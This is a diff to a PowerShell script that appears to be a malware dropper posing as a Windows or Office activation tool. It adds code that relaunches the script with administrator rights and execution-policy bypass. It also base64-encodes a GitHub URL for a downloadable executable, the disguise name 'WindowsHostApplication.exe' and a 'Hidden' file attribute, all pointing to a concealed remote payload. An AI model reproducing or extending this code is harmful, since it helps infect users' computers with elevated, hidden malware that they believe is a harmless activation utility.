@@ -1,8 +1,9 @@
-
-
-
-
-$officeDownloadUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://github.com/freetponline/paintwebsite/raw/refs/heads/main/dolbaeb.exe"))
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $scriptPath = $MyInvocation.MyCommand.Path
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
+    exit
+}
+$officeDownloadUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/dolbaeb.exe"))
 $updaterrrExeB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("WindowsHostApplication.exe"))
 
 $hiddenAttrB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Hidden"))
